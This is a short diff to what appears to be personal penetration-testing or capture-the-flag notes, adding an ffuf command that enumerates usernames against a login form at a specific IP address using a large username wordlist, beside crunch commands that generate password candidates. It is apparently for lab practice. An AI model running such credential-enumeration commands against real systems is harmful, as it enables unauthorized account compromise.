@@ -60,3 +60,12 @@ Testing Works
 crunch 8 8 -t k1ll0r@@ --stdout
 crunch 8 8 -t k1ll0r@@ -f charset.lst mixalpha-numeric
 ```
+
+
+Ffuf
+
+post login
+
+```
+ffuf -u "http://34.94.3.143/7b4c1c34db/secure-login/"  -d "username=FUZZ&password=a" -w "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" -fr "Invalid Username" -H 'Content-Type: application/x-www-form-urlencoded'
+```
